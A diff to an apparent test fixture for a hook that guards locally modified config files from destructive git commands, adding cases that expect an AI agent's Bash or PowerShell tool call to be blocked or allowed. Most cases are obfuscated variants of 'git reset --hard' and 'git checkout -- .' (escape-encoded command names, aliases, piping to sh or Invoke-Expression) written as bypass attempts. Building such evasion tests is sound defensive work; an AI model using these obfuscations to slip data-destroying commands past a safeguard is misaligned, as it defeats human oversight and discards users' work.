@@ -10972,6 +10972,1742 @@
       },
       "expect": "BLOCK",
       "parser": "only"
+    },
+    {
+      "label": "plumbing［清單內檔 dirty］git checkout-index -f -a（-f 蓋掉已存在的檔、-a 整個 index 寫回工作區）",
+      "setup": {
+        "files": {
+          "conf.txt": "a=1\n",
+          "plain.js": "p\n",
+          "a": "a\n",
+          ".claude/local-overrides.yml": "app:\n  repo: .\n  files:\n    - path: conf.txt\n      reason: 本機連線\n"
+        },
+        "commit": true,
+        "files_after_commit": {
+          "conf.txt": "a=LOCAL\n"
+        }
+      },
+      "payload": {
+        "tool_name": "Bash",
+        "tool_input": {
+          "command": "git checkout-index -f -a"
+        }
+      },
+      "expect": "BLOCK"
+    },
+    {
+      "label": "plumbing［清單內檔 dirty］git read-tree -u --reset HEAD（-u 依 tree 更新工作區）",
+      "setup": {
+        "files": {
+          "conf.txt": "a=1\n",
+          "plain.js": "p\n",
+          "a": "a\n",
+          ".claude/local-overrides.yml": "app:\n  repo: .\n  files:\n    - path: conf.txt\n      reason: 本機連線\n"
+        },
+        "commit": true,
+        "files_after_commit": {
+          "conf.txt": "a=LOCAL\n"
+        }
+      },
+      "payload": {
+        "tool_name": "Bash",
+        "tool_input": {
+          "command": "git read-tree -u --reset HEAD"
+        }
+      },
+      "expect": "BLOCK"
+    },
+    {
+      "label": "plumbing［清單內檔 dirty］git mv -f plain.js conf.txt（-f 用來源檔蓋掉覆寫檔）",
+      "setup": {
+        "files": {
+          "conf.txt": "a=1\n",
+          "plain.js": "p\n",
+          "a": "a\n",
+          ".claude/local-overrides.yml": "app:\n  repo: .\n  files:\n    - path: conf.txt\n      reason: 本機連線\n"
+        },
+        "commit": true,
+        "files_after_commit": {
+          "conf.txt": "a=LOCAL\n"
+        }
+      },
+      "payload": {
+        "tool_name": "Bash",
+        "tool_input": {
+          "command": "git mv -f plain.js conf.txt"
+        }
+      },
+      "expect": "BLOCK"
+    },
+    {
+      "label": "plumbing［清單內檔 dirty］git checkout-index --temp conf.txt（--temp 寫到暫存檔，不碰原檔）",
+      "setup": {
+        "files": {
+          "conf.txt": "a=1\n",
+          "plain.js": "p\n",
+          "a": "a\n",
+          ".claude/local-overrides.yml": "app:\n  repo: .\n  files:\n    - path: conf.txt\n      reason: 本機連線\n"
+        },
+        "commit": true,
+        "files_after_commit": {
+          "conf.txt": "a=LOCAL\n"
+        }
+      },
+      "payload": {
+        "tool_name": "Bash",
+        "tool_input": {
+          "command": "git checkout-index --temp conf.txt"
+        }
+      },
+      "expect": "ALLOW"
+    },
+    {
+      "label": "plumbing［清單內檔 dirty］git read-tree HEAD（不帶 -u／--reset 只動 index、且不丟改動）",
+      "setup": {
+        "files": {
+          "conf.txt": "a=1\n",
+          "plain.js": "p\n",
+          "a": "a\n",
+          ".claude/local-overrides.yml": "app:\n  repo: .\n  files:\n    - path: conf.txt\n      reason: 本機連線\n"
+        },
+        "commit": true,
+        "files_after_commit": {
+          "conf.txt": "a=LOCAL\n"
+        }
+      },
+      "payload": {
+        "tool_name": "Bash",
+        "tool_input": {
+          "command": "git read-tree HEAD"
+        }
+      },
+      "expect": "ALLOW"
+    },
+    {
+      "label": "plumbing［清單內檔 dirty］git mv a b（不帶 -f 目標存在時 git 會拒絕）",
+      "setup": {
+        "files": {
+          "conf.txt": "a=1\n",
+          "plain.js": "p\n",
+          "a": "a\n",
+          ".claude/local-overrides.yml": "app:\n  repo: .\n  files:\n    - path: conf.txt\n      reason: 本機連線\n"
+        },
+        "commit": true,
+        "files_after_commit": {
+          "conf.txt": "a=LOCAL\n"
+        }
+      },
+      "payload": {
+        "tool_name": "Bash",
+        "tool_input": {
+          "command": "git mv a b"
+        }
+      },
+      "expect": "ALLOW"
+    },
+    {
+      "label": "清單內檔 dirty·R2 R1-3 動詞變形 H01 動詞由命令替換產生：git $(echo reset) --hard［兩條路徑都擋：正則路徑也採用 git-calls 的結果，2026-10-18 第二批］",
+      "setup": {
+        "files": {
+          "conf.txt": "a=1\n",
+          ".claude/local-overrides.yml": "app:\n  repo: .\n  files:\n    - path: conf.txt\n      reason: 本機連線字串\n"
+        },
+        "commit": true,
+        "files_after_commit": {
+          "conf.txt": "a=LOCAL\n"
+        }
+      },
+      "payload": {
+        "tool_name": "Bash",
+        "tool_input": {
+          "command": "git $(echo reset) --hard"
+        }
+      },
+      "expect": "BLOCK"
+    },
+    {
+      "label": "清單內檔 dirty·R2 R1-3 動詞變形 H02 動詞加引號：git \"reset\" --hard［兩條路徑都擋：正則路徑也採用 git-calls 的結果，2026-10-18 第二批］",
+      "setup": {
+        "files": {
+          "conf.txt": "a=1\n",
+          ".claude/local-overrides.yml": "app:\n  repo: .\n  files:\n    - path: conf.txt\n      reason: 本機連線字串\n"
+        },
+        "commit": true,
+        "files_after_commit": {
+          "conf.txt": "a=LOCAL\n"
+        }
+      },
+      "payload": {
+        "tool_name": "Bash",
+        "tool_input": {
+          "command": "git \"reset\" --hard"
+        }
+      },
+      "expect": "BLOCK"
+    },
+    {
+      "label": "清單內檔 dirty·R2 R1-3 動詞變形 H03 空引號拆字：git re''set --hard［兩條路徑都擋：正則路徑也採用 git-calls 的結果，2026-10-18 第二批］",
+      "setup": {
+        "files": {
+          "conf.txt": "a=1\n",
+          ".claude/local-overrides.yml": "app:\n  repo: .\n  files:\n    - path: conf.txt\n      reason: 本機連線字串\n"
+        },
+        "commit": true,
+        "files_after_commit": {
+          "conf.txt": "a=LOCAL\n"
+        }
+      },
+      "payload": {
+        "tool_name": "Bash",
+        "tool_input": {
+          "command": "git re''set --hard"
+        }
+      },
+      "expect": "BLOCK"
+    },
+    {
+      "label": "清單內檔 dirty·R2 R1-3 動詞變形 H04 反斜線前導動詞：git \\reset --hard［兩條路徑都擋：正則路徑也採用 git-calls 的結果，2026-10-18 第二批］",
+      "setup": {
+        "files": {
+          "conf.txt": "a=1\n",
+          ".claude/local-overrides.yml": "app:\n  repo: .\n  files:\n    - path: conf.txt\n      reason: 本機連線字串\n"
+        },
+        "commit": true,
+        "files_after_commit": {
+          "conf.txt": "a=LOCAL\n"
+        }
+      },
+      "payload": {
+        "tool_name": "Bash",
+        "tool_input": {
+          "command": "git \\reset --hard"
+        }
+      },
+      "expect": "BLOCK"
+    },
+    {
+      "label": "清單內檔 dirty·R2 R1-3 動詞變形 H05 ANSI-C 引號動詞：git $'reset' --hard［兩條路徑都擋：正則路徑也採用 git-calls 的結果，2026-10-18 第二批］",
+      "setup": {
+        "files": {
+          "conf.txt": "a=1\n",
+          ".claude/local-overrides.yml": "app:\n  repo: .\n  files:\n    - path: conf.txt\n      reason: 本機連線字串\n"
+        },
+        "commit": true,
+        "files_after_commit": {
+          "conf.txt": "a=LOCAL\n"
+        }
+      },
+      "payload": {
+        "tool_name": "Bash",
+        "tool_input": {
+          "command": "git $'reset' --hard"
+        }
+      },
+      "expect": "BLOCK"
+    },
+    {
+      "label": "清單內檔 dirty·R2 R1-3 動詞變形 H06 全域選項插在動詞前：git --no-optional-locks reset --hard［兩條路徑都擋：正則路徑也採用 git-calls 的結果，2026-10-18 第二批］",
+      "setup": {
+        "files": {
+          "conf.txt": "a=1\n",
+          ".claude/local-overrides.yml": "app:\n  repo: .\n  files:\n    - path: conf.txt\n      reason: 本機連線字串\n"
+        },
+        "commit": true,
+        "files_after_commit": {
+          "conf.txt": "a=LOCAL\n"
+        }
+      },
+      "payload": {
+        "tool_name": "Bash",
+        "tool_input": {
+          "command": "git --no-optional-locks reset --hard"
+        }
+      },
+      "expect": "BLOCK"
+    },
+    {
+      "label": "清單內檔 dirty·R2 R1-3 動詞變形 H07 -c alias 當場定義：git -c alias.r='reset --hard' r［兩條路徑都擋：正則路徑也採用 git-calls 的結果，2026-10-18 第二批］",
+      "setup": {
+        "files": {
+          "conf.txt": "a=1\n",
+          ".claude/local-overrides.yml": "app:\n  repo: .\n  files:\n    - path: conf.txt\n      reason: 本機連線字串\n"
+        },
+        "commit": true,
+        "files_after_commit": {
+          "conf.txt": "a=LOCAL\n"
+        }
+      },
+      "payload": {
+        "tool_name": "Bash",
+        "tool_input": {
+          "command": "git -c alias.r='reset --hard' r"
+        }
+      },
+      "expect": "BLOCK"
+    },
+    {
+      "label": "清單內檔 dirty·R2 R1-3 動詞變形 H07b -c alias checkout：git -c alias.co=checkout co -- .［兩條路徑都擋：正則路徑也採用 git-calls 的結果，2026-10-18 第二批］",
+      "setup": {
+        "files": {
+          "conf.txt": "a=1\n",
+          ".claude/local-overrides.yml": "app:\n  repo: .\n  files:\n    - path: conf.txt\n      reason: 本機連線字串\n"
+        },
+        "commit": true,
+        "files_after_commit": {
+          "conf.txt": "a=LOCAL\n"
+        }
+      },
+      "payload": {
+        "tool_name": "Bash",
+        "tool_input": {
+          "command": "git -c alias.co=checkout co -- ."
+        }
+      },
+      "expect": "BLOCK"
+    },
+    {
+      "label": "清單內檔 dirty·R2 R1-3 動詞變形 H08 printf 餵 sh：printf 'git reset --hard' | sh［兩條路徑都擋：正則路徑也採用 git-calls 的結果，2026-10-18 第二批］",
+      "setup": {
+        "files": {
+          "conf.txt": "a=1\n",
+          ".claude/local-overrides.yml": "app:\n  repo: .\n  files:\n    - path: conf.txt\n      reason: 本機連線字串\n"
+        },
+        "commit": true,
+        "files_after_commit": {
+          "conf.txt": "a=LOCAL\n"
+        }
+      },
+      "payload": {
+        "tool_name": "Bash",
+        "tool_input": {
+          "command": "printf 'git reset --hard' | sh"
+        }
+      },
+      "expect": "BLOCK"
+    },
+    {
+      "label": "清單內檔 dirty·R2 R1-3 動詞變形 H09 heredoc 餵 sh：cat <<'EOF' | sh⏎git reset --hard⏎EOF［兩條路徑都擋：正則路徑也採用 git-calls 的結果，2026-10-18 第二批］",
+      "setup": {
+        "files": {
+          "conf.txt": "a=1\n",
+          ".claude/local-overrides.yml": "app:\n  repo: .\n  files:\n    - path: conf.txt\n      reason: 本機連線字串\n"
+        },
+        "commit": true,
+        "files_after_commit": {
+          "conf.txt": "a=LOCAL\n"
+        }
+      },
+      "payload": {
+        "tool_name": "Bash",
+        "tool_input": {
+          "command": "cat <<'EOF' | sh\ngit reset --hard\nEOF"
+        }
+      },
+      "expect": "BLOCK"
+    },
+    {
+      "label": "清單內檔 dirty·R2 R1-3 動詞變形 H10 bash -c -- 包住：bash -c -- 'git reset --hard'［兩條路徑都擋：正則路徑也採用 git-calls 的結果，2026-10-18 第二批］",
+      "setup": {
+        "files": {
+          "conf.txt": "a=1\n",
+          ".claude/local-overrides.yml": "app:\n  repo: .\n  files:\n    - path: conf.txt\n      reason: 本機連線字串\n"
+        },
+        "commit": true,
+        "files_after_commit": {
+          "conf.txt": "a=LOCAL\n"
+        }
+      },
+      "payload": {
+        "tool_name": "Bash",
+        "tool_input": {
+          "command": "bash -c -- 'git reset --hard'"
+        }
+      },
+      "expect": "BLOCK"
+    },
+    {
+      "label": "清單內檔 dirty·R2 R1-3 動詞變形 H11 xargs 從 stdin 給動詞：printf 'reset --hard' | xargs git［兩條路徑都擋：正則路徑也採用 git-calls 的結果，2026-10-18 第二批］",
+      "setup": {
+        "files": {
+          "conf.txt": "a=1\n",
+          ".claude/local-overrides.yml": "app:\n  repo: .\n  files:\n    - path: conf.txt\n      reason: 本機連線字串\n"
+        },
+        "commit": true,
+        "files_after_commit": {
+          "conf.txt": "a=LOCAL\n"
+        }
+      },
+      "payload": {
+        "tool_name": "Bash",
+        "tool_input": {
+          "command": "printf 'reset --hard' | xargs git"
+        }
+      },
+      "expect": "BLOCK"
+    },
+    {
+      "label": "清單內檔 dirty·R2 R1-3 動詞變形 H12 PowerShell --% 停止解析：git --% reset --hard［兩條路徑都擋：正則路徑也採用 git-calls 的結果，2026-10-18 第二批］",
+      "setup": {
+        "files": {
+          "conf.txt": "a=1\n",
+          ".claude/local-overrides.yml": "app:\n  repo: .\n  files:\n    - path: conf.txt\n      reason: 本機連線字串\n"
+        },
+        "commit": true,
+        "files_after_commit": {
+          "conf.txt": "a=LOCAL\n"
+        }
+      },
+      "payload": {
+        "tool_name": "PowerShell",
+        "tool_input": {
+          "command": "git --% reset --hard"
+        }
+      },
+      "expect": "BLOCK"
+    },
+    {
+      "label": "清單內檔 dirty·R2 R1-3 動詞變形 H13 PowerShell 反引號拆字：git re`set --hard［兩條路徑都擋：正則路徑也採用 git-calls 的結果，2026-10-18 第二批］",
+      "setup": {
+        "files": {
+          "conf.txt": "a=1\n",
+          ".claude/local-overrides.yml": "app:\n  repo: .\n  files:\n    - path: conf.txt\n      reason: 本機連線字串\n"
+        },
+        "commit": true,
+        "files_after_commit": {
+          "conf.txt": "a=LOCAL\n"
+        }
+      },
+      "payload": {
+        "tool_name": "PowerShell",
+        "tool_input": {
+          "command": "git re`set --hard"
+        }
+      },
+      "expect": "BLOCK"
+    },
+    {
+      "label": "清單內檔 dirty·R2 R1-3 動詞變形 H14 PowerShell 字串餵 Invoke-Expression：'git reset --hard' | Invoke-Expression［兩條路徑都擋：正則路徑也採用 git-calls 的結果，2026-10-18 第二批］",
+      "setup": {
+        "files": {
+          "conf.txt": "a=1\n",
+          ".claude/local-overrides.yml": "app:\n  repo: .\n  files:\n    - path: conf.txt\n      reason: 本機連線字串\n"
+        },
+        "commit": true,
+        "files_after_commit": {
+          "conf.txt": "a=LOCAL\n"
+        }
+      },
+      "payload": {
+        "tool_name": "PowerShell",
+        "tool_input": {
+          "command": "'git reset --hard' | Invoke-Expression"
+        }
+      },
+      "expect": "BLOCK"
+    },
+    {
+      "label": "清單內檔 dirty·R2 R1-3 動詞變形 H15 awk system 執行：awk 'BEGIN{system(\"git reset --hard\")}'［兩條路徑都擋：正則路徑也採用 git-calls 的結果，2026-10-18 第二批］",
+      "setup": {
+        "files": {
+          "conf.txt": "a=1\n",
+          ".claude/local-overrides.yml": "app:\n  repo: .\n  files:\n    - path: conf.txt\n      reason: 本機連線字串\n"
+        },
+        "commit": true,
+        "files_after_commit": {
+          "conf.txt": "a=LOCAL\n"
+        }
+      },
+      "payload": {
+        "tool_name": "Bash",
+        "tool_input": {
+          "command": "awk 'BEGIN{system(\"git reset --hard\")}'"
+        }
+      },
+      "expect": "BLOCK"
+    },
+    {
+      "label": "清單內檔 dirty·R2 R1-3 動詞變形 H16 GIT_CONFIG_PARAMETERS 注入 alias：GIT_CONFIG_PARAMETERS=\"'alias.r=reset --hard'\" git r［兩條路徑都擋：正則路徑也採用 git-calls 的結果，2026-10-18 第二批］",
+      "setup": {
+        "files": {
+          "conf.txt": "a=1\n",
+          ".claude/local-overrides.yml": "app:\n  repo: .\n  files:\n    - path: conf.txt\n      reason: 本機連線字串\n"
+        },
+        "commit": true,
+        "files_after_commit": {
+          "conf.txt": "a=LOCAL\n"
+        }
+      },
+      "payload": {
+        "tool_name": "Bash",
+        "tool_input": {
+          "command": "GIT_CONFIG_PARAMETERS=\"'alias.r=reset --hard'\" git r"
+        }
+      },
+      "expect": "BLOCK"
+    },
+    {
+      "label": "清單內檔 dirty·R3 R3A-1 ANSI-C 十六進位拼出 git：$'\\x67it' checkout -- .［2026-10-18 R3 修：git-calls 初篩解 ANSI-C、非字面指令名接危險動詞發 unsure；兩條路徑都跑］",
+      "setup": {
+        "files": {
+          "conf.txt": "a=1\n",
+          ".claude/local-overrides.yml": "app:\n  repo: .\n  files:\n    - path: conf.txt\n      reason: 本機連線字串\n"
+        },
+        "commit": true,
+        "files_after_commit": {
+          "conf.txt": "a=LOCAL\n"
+        }
+      },
+      "payload": {
+        "tool_name": "Bash",
+        "tool_input": {
+          "command": "$'\\x67it' checkout -- ."
+        }
+      },
+      "expect": "BLOCK"
+    },
+    {
+      "label": "清單內檔 dirty·R3 R3A-1 ANSI-C 接在字尾：gi$'t' reset --hard［2026-10-18 R3 修：git-calls 初篩解 ANSI-C、非字面指令名接危險動詞發 unsure；兩條路徑都跑］",
+      "setup": {
+        "files": {
+          "conf.txt": "a=1\n",
+          ".claude/local-overrides.yml": "app:\n  repo: .\n  files:\n    - path: conf.txt\n      reason: 本機連線字串\n"
+        },
+        "commit": true,
+        "files_after_commit": {
+          "conf.txt": "a=LOCAL\n"
+        }
+      },
+      "payload": {
+        "tool_name": "Bash",
+        "tool_input": {
+          "command": "gi$'t' reset --hard"
+        }
+      },
+      "expect": "BLOCK"
+    },
+    {
+      "label": "清單內檔 dirty·R3 R3A-1 ANSI-C 八進位加 -C：$'\\147it' -C . reset --hard［2026-10-18 R3 修：git-calls 初篩解 ANSI-C、非字面指令名接危險動詞發 unsure；兩條路徑都跑］",
+      "setup": {
+        "files": {
+          "conf.txt": "a=1\n",
+          ".claude/local-overrides.yml": "app:\n  repo: .\n  files:\n    - path: conf.txt\n      reason: 本機連線字串\n"
+        },
+        "commit": true,
+        "files_after_commit": {
+          "conf.txt": "a=LOCAL\n"
+        }
+      },
+      "payload": {
+        "tool_name": "Bash",
+        "tool_input": {
+          "command": "$'\\147it' -C . reset --hard"
+        }
+      },
+      "expect": "BLOCK"
+    },
+    {
+      "label": "清單內檔 dirty·R3 R3A-1 ANSI-C 拆動詞：git check$'out' -- .［2026-10-18 R3 修：git-calls 初篩解 ANSI-C、非字面指令名接危險動詞發 unsure；兩條路徑都跑］",
+      "setup": {
+        "files": {
+          "conf.txt": "a=1\n",
+          ".claude/local-overrides.yml": "app:\n  repo: .\n  files:\n    - path: conf.txt\n      reason: 本機連線字串\n"
+        },
+        "commit": true,
+        "files_after_commit": {
+          "conf.txt": "a=LOCAL\n"
+        }
+      },
+      "payload": {
+        "tool_name": "Bash",
+        "tool_input": {
+          "command": "git check$'out' -- ."
+        }
+      },
+      "expect": "BLOCK"
+    },
+    {
+      "label": "清單內檔 dirty·R3 藍方新 1 PowerShell 拆字拼接指令名：& ('g'+'it') reset --hard［2026-10-18 R3 修：git-calls 初篩解 ANSI-C、非字面指令名接危險動詞發 unsure；兩條路徑都跑］",
+      "setup": {
+        "files": {
+          "conf.txt": "a=1\n",
+          ".claude/local-overrides.yml": "app:\n  repo: .\n  files:\n    - path: conf.txt\n      reason: 本機連線字串\n"
+        },
+        "commit": true,
+        "files_after_commit": {
+          "conf.txt": "a=LOCAL\n"
+        }
+      },
+      "payload": {
+        "tool_name": "PowerShell",
+        "tool_input": {
+          "command": "& ('g'+'it') reset --hard"
+        }
+      },
+      "expect": "BLOCK"
+    },
+    {
+      "label": "清單內檔 dirty·R3 藍方新 1 PowerShell Invoke-Expression 拼接字串［2026-10-18 R3 修：git-calls 初篩解 ANSI-C、非字面指令名接危險動詞發 unsure；兩條路徑都跑］",
+      "setup": {
+        "files": {
+          "conf.txt": "a=1\n",
+          ".claude/local-overrides.yml": "app:\n  repo: .\n  files:\n    - path: conf.txt\n      reason: 本機連線字串\n"
+        },
+        "commit": true,
+        "files_after_commit": {
+          "conf.txt": "a=LOCAL\n"
+        }
+      },
+      "payload": {
+        "tool_name": "PowerShell",
+        "tool_input": {
+          "command": "Invoke-Expression ('g'+'it reset --hard')"
+        }
+      },
+      "expect": "BLOCK"
+    },
+    {
+      "label": "清單內檔 dirty·R3 藍方新 1 PowerShell & (Get-Command git) checkout -- .（off 路徑原本放行）［2026-10-18 R3 修：git-calls 初篩解 ANSI-C、非字面指令名接危險動詞發 unsure；兩條路徑都跑］",
+      "setup": {
+        "files": {
+          "conf.txt": "a=1\n",
+          ".claude/local-overrides.yml": "app:\n  repo: .\n  files:\n    - path: conf.txt\n      reason: 本機連線字串\n"
+        },
+        "commit": true,
+        "files_after_commit": {
+          "conf.txt": "a=LOCAL\n"
+        }
+      },
+      "payload": {
+        "tool_name": "PowerShell",
+        "tool_input": {
+          "command": "& (Get-Command git) checkout -- ."
+        }
+      },
+      "expect": "BLOCK"
+    },
+    {
+      "label": "清單內檔 dirty·R3 藍方新 1 命令替換指令名接危險動詞：\"$(printf 'g%s' it)\" checkout -- .［2026-10-18 R3 修：git-calls 初篩解 ANSI-C、非字面指令名接危險動詞發 unsure；兩條路徑都跑］",
+      "setup": {
+        "files": {
+          "conf.txt": "a=1\n",
+          ".claude/local-overrides.yml": "app:\n  repo: .\n  files:\n    - path: conf.txt\n      reason: 本機連線字串\n"
+        },
+        "commit": true,
+        "files_after_commit": {
+          "conf.txt": "a=LOCAL\n"
+        }
+      },
+      "payload": {
+        "tool_name": "Bash",
+        "tool_input": {
+          "command": "\"$(printf 'g%s' it)\" checkout -- ."
+        }
+      },
+      "expect": "BLOCK"
+    },
+    {
+      "label": "清單內檔 dirty·R3 藍方新 1 對照 $(which git) stash（原本就擋）［2026-10-18 R3 修：git-calls 初篩解 ANSI-C、非字面指令名接危險動詞發 unsure；兩條路徑都跑］",
+      "setup": {
+        "files": {
+          "conf.txt": "a=1\n",
+          ".claude/local-overrides.yml": "app:\n  repo: .\n  files:\n    - path: conf.txt\n      reason: 本機連線字串\n"
+        },
+        "commit": true,
+        "files_after_commit": {
+          "conf.txt": "a=LOCAL\n"
+        }
+      },
+      "payload": {
+        "tool_name": "Bash",
+        "tool_input": {
+          "command": "$(which git) stash"
+        }
+      },
+      "expect": "BLOCK"
+    },
+    {
+      "label": "清單內檔 dirty·R3 對照 純變數指令名、無危險動詞：$cmd --version［2026-10-18 R3 修：git-calls 初篩解 ANSI-C、非字面指令名接危險動詞發 unsure；兩條路徑都跑］",
+      "setup": {
+        "files": {
+          "conf.txt": "a=1\n",
+          ".claude/local-overrides.yml": "app:\n  repo: .\n  files:\n    - path: conf.txt\n      reason: 本機連線字串\n"
+        },
+        "commit": true,
+        "files_after_commit": {
+          "conf.txt": "a=LOCAL\n"
+        }
+      },
+      "payload": {
+        "tool_name": "Bash",
+        "tool_input": {
+          "command": "$cmd --version"
+        }
+      },
+      "expect": "ALLOW"
+    },
+    {
+      "label": "清單內檔 dirty·R3 對照 PowerShell & $tool list（純變數、無危險動詞）［2026-10-18 R3 修：git-calls 初篩解 ANSI-C、非字面指令名接危險動詞發 unsure；兩條路徑都跑］",
+      "setup": {
+        "files": {
+          "conf.txt": "a=1\n",
+          ".claude/local-overrides.yml": "app:\n  repo: .\n  files:\n    - path: conf.txt\n      reason: 本機連線字串\n"
+        },
+        "commit": true,
+        "files_after_commit": {
+          "conf.txt": "a=LOCAL\n"
+        }
+      },
+      "payload": {
+        "tool_name": "PowerShell",
+        "tool_input": {
+          "command": "& $tool list"
+        }
+      },
+      "expect": "ALLOW"
+    },
+    {
+      "label": "清單內檔 dirty·R3 對照 命令替換指令名但只接 --version［2026-10-18 R3 修：git-calls 初篩解 ANSI-C、非字面指令名接危險動詞發 unsure；兩條路徑都跑］",
+      "setup": {
+        "files": {
+          "conf.txt": "a=1\n",
+          ".claude/local-overrides.yml": "app:\n  repo: .\n  files:\n    - path: conf.txt\n      reason: 本機連線字串\n"
+        },
+        "commit": true,
+        "files_after_commit": {
+          "conf.txt": "a=LOCAL\n"
+        }
+      },
+      "payload": {
+        "tool_name": "Bash",
+        "tool_input": {
+          "command": "\"$(printf 'g%s' it)\" --version"
+        }
+      },
+      "expect": "ALLOW"
+    },
+    {
+      "label": "清單內檔 dirty·R3 對照 ANSI-C 拼出的 git 接唯讀動詞［2026-10-18 R3 修：git-calls 初篩解 ANSI-C、非字面指令名接危險動詞發 unsure；兩條路徑都跑］",
+      "setup": {
+        "files": {
+          "conf.txt": "a=1\n",
+          ".claude/local-overrides.yml": "app:\n  repo: .\n  files:\n    - path: conf.txt\n      reason: 本機連線字串\n"
+        },
+        "commit": true,
+        "files_after_commit": {
+          "conf.txt": "a=LOCAL\n"
+        }
+      },
+      "payload": {
+        "tool_name": "Bash",
+        "tool_input": {
+          "command": "$'\\x67it' status"
+        }
+      },
+      "expect": "ALLOW"
+    },
+    {
+      "label": "清單內檔 dirty·R3 對照 echo 引述 ANSI-C（純顯示）［2026-10-18 R3 修：git-calls 初篩解 ANSI-C、非字面指令名接危險動詞發 unsure；兩條路徑都跑］",
+      "setup": {
+        "files": {
+          "conf.txt": "a=1\n",
+          ".claude/local-overrides.yml": "app:\n  repo: .\n  files:\n    - path: conf.txt\n      reason: 本機連線字串\n"
+        },
+        "commit": true,
+        "files_after_commit": {
+          "conf.txt": "a=LOCAL\n"
+        }
+      },
+      "payload": {
+        "tool_name": "Bash",
+        "tool_input": {
+          "command": "echo $'git reset --hard'"
+        }
+      },
+      "expect": "ALLOW"
+    },
+    {
+      "label": "清單內檔 dirty·R3v G1 \\uHHHH 拼出 git：$'\\u0067it' checkout -- .（語法樹路徑原本解成 u0067it 放行）［2026-10-18 R3 複驗修：shell-model 解碼補 \\u／\\U 且只留一份、管線餵 iex 的運算式、括號平衡計數、$(which X) 當字面 X；兩條路徑都跑］",
+      "setup": {
+        "files": {
+          "conf.txt": "a=1\n",
+          ".claude/local-overrides.yml": "app:\n  repo: .\n  files:\n    - path: conf.txt\n      reason: 本機連線字串\n"
+        },
+        "commit": true,
+        "files_after_commit": {
+          "conf.txt": "a=LOCAL\n"
+        }
+      },
+      "payload": {
+        "tool_name": "Bash",
+        "tool_input": {
+          "command": "$'\\u0067it' checkout -- ."
+        }
+      },
+      "expect": "BLOCK"
+    },
+    {
+      "label": "清單內檔 dirty·R3v G1 \\UHHHHHHHH 拼出 git：$'\\U00000067it' -C . reset --hard［2026-10-18 R3 複驗修：shell-model 解碼補 \\u／\\U 且只留一份、管線餵 iex 的運算式、括號平衡計數、$(which X) 當字面 X；兩條路徑都跑］",
+      "setup": {
+        "files": {
+          "conf.txt": "a=1\n",
+          ".claude/local-overrides.yml": "app:\n  repo: .\n  files:\n    - path: conf.txt\n      reason: 本機連線字串\n"
+        },
+        "commit": true,
+        "files_after_commit": {
+          "conf.txt": "a=LOCAL\n"
+        }
+      },
+      "payload": {
+        "tool_name": "Bash",
+        "tool_input": {
+          "command": "$'\\U00000067it' -C . reset --hard"
+        }
+      },
+      "expect": "BLOCK"
+    },
+    {
+      "label": "清單內檔 dirty·R3v G1 ANSI-C 動詞：$'\\x72eset' --hard［2026-10-18 R3 複驗修：shell-model 解碼補 \\u／\\U 且只留一份、管線餵 iex 的運算式、括號平衡計數、$(which X) 當字面 X；兩條路徑都跑］",
+      "setup": {
+        "files": {
+          "conf.txt": "a=1\n",
+          ".claude/local-overrides.yml": "app:\n  repo: .\n  files:\n    - path: conf.txt\n      reason: 本機連線字串\n"
+        },
+        "commit": true,
+        "files_after_commit": {
+          "conf.txt": "a=LOCAL\n"
+        }
+      },
+      "payload": {
+        "tool_name": "Bash",
+        "tool_input": {
+          "command": "$'\\x67it' -C . $'\\x72eset' --hard"
+        }
+      },
+      "expect": "BLOCK"
+    },
+    {
+      "label": "清單內檔 dirty·R3v G2① PowerShell 拼接字串經管線餵 iex［2026-10-18 R3 複驗修：shell-model 解碼補 \\u／\\U 且只留一份、管線餵 iex 的運算式、括號平衡計數、$(which X) 當字面 X；兩條路徑都跑］",
+      "setup": {
+        "files": {
+          "conf.txt": "a=1\n",
+          ".claude/local-overrides.yml": "app:\n  repo: .\n  files:\n    - path: conf.txt\n      reason: 本機連線字串\n"
+        },
+        "commit": true,
+        "files_after_commit": {
+          "conf.txt": "a=LOCAL\n"
+        }
+      },
+      "payload": {
+        "tool_name": "PowerShell",
+        "tool_input": {
+          "command": "('g'+'it reset --hard') | iex"
+        }
+      },
+      "expect": "BLOCK"
+    },
+    {
+      "label": "清單內檔 dirty·R3v G2① PowerShell 拼接字串經管線餵 Invoke-Expression［2026-10-18 R3 複驗修：shell-model 解碼補 \\u／\\U 且只留一份、管線餵 iex 的運算式、括號平衡計數、$(which X) 當字面 X；兩條路徑都跑］",
+      "setup": {
+        "files": {
+          "conf.txt": "a=1\n",
+          ".claude/local-overrides.yml": "app:\n  repo: .\n  files:\n    - path: conf.txt\n      reason: 本機連線字串\n"
+        },
+        "commit": true,
+        "files_after_commit": {
+          "conf.txt": "a=LOCAL\n"
+        }
+      },
+      "payload": {
+        "tool_name": "PowerShell",
+        "tool_input": {
+          "command": "('g'+'it checkout -- .') | Invoke-Expression"
+        }
+      },
+      "expect": "BLOCK"
+    },
+    {
+      "label": "清單內檔 dirty·R3v G2② PowerShell 三層巢狀 [string]::Join 陣列指令名（語法樹解析失敗退正則，括號平衡計數）［2026-10-18 R3 複驗修：shell-model 解碼補 \\u／\\U 且只留一份、管線餵 iex 的運算式、括號平衡計數、$(which X) 當字面 X；兩條路徑都跑］",
+      "setup": {
+        "files": {
+          "conf.txt": "a=1\n",
+          ".claude/local-overrides.yml": "app:\n  repo: .\n  files:\n    - path: conf.txt\n      reason: 本機連線字串\n"
+        },
+        "commit": true,
+        "files_after_commit": {
+          "conf.txt": "a=LOCAL\n"
+        }
+      },
+      "payload": {
+        "tool_name": "PowerShell",
+        "tool_input": {
+          "command": "& ([string]::Join('', @('g','i','t'))) checkout -- ."
+        }
+      },
+      "expect": "BLOCK"
+    },
+    {
+      "label": "清單內檔 dirty·R3v G2② PowerShell [string]::Join 參數列指令名［2026-10-18 R3 複驗修：shell-model 解碼補 \\u／\\U 且只留一份、管線餵 iex 的運算式、括號平衡計數、$(which X) 當字面 X；兩條路徑都跑］",
+      "setup": {
+        "files": {
+          "conf.txt": "a=1\n",
+          ".claude/local-overrides.yml": "app:\n  repo: .\n  files:\n    - path: conf.txt\n      reason: 本機連線字串\n"
+        },
+        "commit": true,
+        "files_after_commit": {
+          "conf.txt": "a=LOCAL\n"
+        }
+      },
+      "payload": {
+        "tool_name": "PowerShell",
+        "tool_input": {
+          "command": "& ([string]::Join('', 'g','it')) reset --hard"
+        }
+      },
+      "expect": "BLOCK"
+    },
+    {
+      "label": "清單內檔 dirty·R3v G2② PowerShell [string]::Concat 指令名［2026-10-18 R3 複驗修：shell-model 解碼補 \\u／\\U 且只留一份、管線餵 iex 的運算式、括號平衡計數、$(which X) 當字面 X；兩條路徑都跑］",
+      "setup": {
+        "files": {
